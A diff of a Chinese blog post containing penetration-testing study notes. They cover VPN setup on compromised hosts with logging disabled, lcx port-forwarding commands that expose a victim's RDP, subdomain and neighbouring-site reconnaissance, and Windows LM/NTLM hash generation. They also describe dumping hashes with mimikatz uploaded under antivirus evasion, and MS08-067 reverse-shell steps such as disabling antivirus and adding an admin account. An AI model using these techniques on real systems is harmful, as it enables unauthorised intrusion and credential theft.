@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">140</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">5 分钟</span>
         </span>
     </span>
 </div>
@@ -119,14 +119,98 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1-VPN"><a href="#1-VPN" class="headerlink" title="1.VPN"></a>1.VPN</h1><p>虚拟专用网络，该技术提供了一种通过<strong>公用</strong>网络安全地对企业<strong>内部专用</strong>网络进行远程访问的连接方式。分为软件VPN与硬件VPN</p>
+  <h1 id="一、web渗透必备技术"><a href="#一、web渗透必备技术" class="headerlink" title="一、web渗透必备技术"></a>一、web渗透必备技术</h1><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>虚拟专用网络，该技术提供了一种通过<strong>公用</strong>网络安全地对企业<strong>内部专用</strong>网络进行远程访问的连接方式。分为软件VPN与硬件VPN</p>
 <p>三个基本要素：</p>
 <blockquote>
 <p>IP封装:即一个IP包包含其他IP包</p>
 <p>加密的身份认证:安全有效地验证远程用户的身份</p>
 <p>数据有效负载加密：加密被封装的数据</p>
 </blockquote>
-<h2 id="VPN服务器"><a href="#VPN服务器" class="headerlink" title="VPN服务器"></a>VPN服务器</h2><p>一般建立独立的vpn服务器，或者在肉鸡上建立vpn服务器（权限尽量低）</p>
+<h3 id="VPN服务器"><a href="#VPN服务器" class="headerlink" title="VPN服务器"></a>VPN服务器</h3><p>一般建立独立的vpn服务器，或者在肉鸡上建立vpn服务器（权限尽量低）</p>
+<p>当然了，肉鸡不一定能遇上，所以一般会使用现成的VPN软件。</p>
+<h4 id="win-2003-server创建-vpn服务器"><a href="#win-2003-server创建-vpn服务器" class="headerlink" title="win 2003 server创建 vpn服务器"></a>win 2003 server创建 vpn服务器</h4><p>1.管理工具-&gt;路由和远程访问</p>
+<p>2.启动路由和远程访问</p>
+<p>3.关闭防火墙</p>
+<p>4.配置并启用路由和远程访问</p>
+<p>5.选择启用的服务：VPN访问、NAT和基本防火墙</p>
+<p>6.配置NAT&#x2F;基本防火墙-&gt;选择接口 （选择本地连接，该IP地址必须是互联网独立IP地址）</p>
+<p>7.公用接口上启用NAT</p>
+<p>8.启用远程访问和路由(LAN,远程)</p>
+<p>9.配置日志（不记录任何事件），重启路由器</p>
+<p>10.授权用户远程访问：本地用户和组的test用户（尽量是低权限的普通用户），在“拨入”窗口中，选择允许访问即可。</p>
+<p>netstat -an | Find “1723” 可查看VPN服务是否开启</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>局域网的某主机只开放了Web服务，只有内网的机器才能访问到</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>想办法将肉鸡A的3389打开，通过<strong>端口转发工具</strong>(如lcx)端口映射到具有外网IP地址的B机上，进而攻击者在本地连接到被控主机的远程终端</p>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>1.<strong>在靶机端</strong>，输入</p>
+<blockquote>
+<p>lcx -slave xxxxx 51 yyyy 3389</p>
+</blockquote>
+<p>即将靶机yyyy的3389端口转发到远程地址xxxx的51端口</p>
+<p>2.<strong>在攻击机端</strong></p>
+<blockquote>
+<p>lcx -lister 51 3389</p>
+</blockquote>
+<p>在攻击机端监听51端口，接收被控端3389端口转发来的数据</p>
+<p>这个原理，与瑞士军刀netcat，一样吧</p>
+<p>3.在<strong>攻击机端</strong>的命令行输入mstsc，弹出远程桌面连接窗口，输入127.0.0.1连接，输入用户名和密码进行连接</p>
+<h2 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h2><p>顶级域名</p>
+<p>.com	.net	.org</p>
+<p>二级域名</p>
+<p>.edu .gov</p>
+<h3 id="在渗透中的作用"><a href="#在渗透中的作用" class="headerlink" title="在渗透中的作用"></a>在渗透中的作用</h3><p>域名地址定位；IP地址查询域名注册情况</p>
+<h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>IP地址反查域名注册情况；域名查IP</p>
+<h3 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h3><p>whois；站长之家</p>
+<h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><p>已知baidu.com</p>
+<p>那么可能有email.baidu.com ; www. baidu.com……</p>
+<p>运用工具layer子域名挖掘机或oneforall，通过字典去枚举即可</p>
+<h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><p>主目标网站渗透未果，则扫描相同IP地址段下的其他IP（一般是C段扫描），对其他IP地址渗透。</p>
+<p>渗透成功后，通过嗅探等手段截获目标网站密码。</p>
+<h2 id="获取windows系统的Hash密码"><a href="#获取windows系统的Hash密码" class="headerlink" title="获取windows系统的Hash密码"></a>获取windows系统的Hash密码</h2><p>windows系统的Hash密码主要由LM-HASH和NTLM-HASH两部分组成。攻击者如果获取了系统的HASH值，通过彩虹表等手段获取到系统的密码。</p>
+<h3 id="Hash基本知识"><a href="#Hash基本知识" class="headerlink" title="Hash基本知识"></a>Hash基本知识</h3><p>散列，或哈希；散列算法，使得输入值变换成固定长度的输出，称为散列值。由于算法的碰撞性（应该是这个吧），不同的输入是有可能散列成相同的输出的，所以，散列值和输入值不是一一对应的。</p>
+<p>它应用于信息安全领域中的加密算法，将不同长度的信息转化成杂乱的128位的编码中。</p>
+<h3 id="Hash算法在密码上的应用"><a href="#Hash算法在密码上的应用" class="headerlink" title="Hash算法在密码上的应用"></a>Hash算法在密码上的应用</h3><p>常见的MD5、SHA1</p>
+<p>应用主要是：</p>
+<p>1.文件校验</p>
+<p>2.数字签名</p>
+<p>3.鉴权协议（挑战-认证模式）</p>
+<h3 id="windows下Hash密码值"><a href="#windows下Hash密码值" class="headerlink" title="windows下Hash密码值"></a>windows下Hash密码值</h3><h4 id="1-Hash密码格式"><a href="#1-Hash密码格式" class="headerlink" title="1.Hash密码格式"></a>1.Hash密码格式</h4><p><strong>用户名称:RID:LM-Hash:NTLM-Hash</strong></p>
+<blockquote>
+<p>如:</p>
+<p>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC</p>
+</blockquote>
+<h4 id="2-LM-Hash生成原理"><a href="#2-LM-Hash生成原理" class="headerlink" title="2.LM-Hash生成原理"></a>2.LM-Hash生成原理</h4><p>以输入为:welcome为例</p>
+<p><strong>先全转化为大写</strong>:</p>
+<blockquote>
+<p>WELCOME</p>
+</blockquote>
+<p> ——&gt;</p>
+<p>再变成<strong>十六进制</strong>字符串 (若不足14字节，0x00去补)：</p>
+<blockquote>
+<p>57454C434F4D4500000000000000</p>
+</blockquote>
+<p>——&gt;</p>
+<p><strong>分割</strong>成<strong>两组7字节</strong>数据，分别用str_to_key()函数处理得到两组8字节数据</p>
+<blockquote>
+<p>57454C434F4D45 -str_to_key()-&gt; 56A25288347A348A<br>00000000000000 -str_to_key()-&gt; 0000000000000000</p>
+</blockquote>
+<p>——&gt;</p>
+<p>这两组8字节数据将做为DESKEY对魔术字符串“KGS!@#$%”<strong>进行标准DES加密</strong></p>
+<blockquote>
+<p>“KGS!@#$%” -&gt; 4B47532140232425<br>56A25288347A348A -对4B47532140232425进行标准DES加密-&gt; C23413A8A1E7665F<br>0000000000000000 -对4B47532140232425进行标准DES加密-&gt; AAD3B435B51404EE</p>
+</blockquote>
+<p>将加密后的这两组数据简单<strong>拼接</strong>，就得到了最后的LM Hash</p>
+<blockquote>
+<p>LM Hash: C23413A8A1E7665FAAD3B435B51404EE</p>
+</blockquote>
+<h4 id="3-NTLM-Hash生成原理"><a href="#3-NTLM-Hash生成原理" class="headerlink" title="3.NTLM-Hash生成原理"></a>3.NTLM-Hash生成原理</h4><p>以输入为:123456为例</p>
+<p><strong>先转换成unicode字符串</strong>(无需补足14字节)</p>
+<p><strong>MD4固定产生128bit哈希值</strong></p>
+<p>与LM-Hash相比，明文口令大小写敏感；摆脱了魔术字符串；MD4是真正的单向哈希函数</p>
+<h3 id="获取密码工具"><a href="#获取密码工具" class="headerlink" title="获取密码工具"></a>获取密码工具</h3><p>gethashes（System权限下），和mimikatz</p>
+<p>一般都是免杀上传到靶机上去，运行获得靶机的hash值，如果是域控的话，那就获得了很多账号密码了。</p>
+<h3 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h3><p>Ms08067漏洞利用工具获得漏洞主机的反弹shell，上传工具，执行命令。</p>
+<p>1.获得反弹shell后，尝试查看系统是否有杀毒软件，并试图关闭，关不了，放弃这一步</p>
+<p>2.看是否能开启3389远程终端，利用该端口，直接添加一个具有管理员权限用户，本地登录到该系统</p>
  
       <!-- reward -->
       
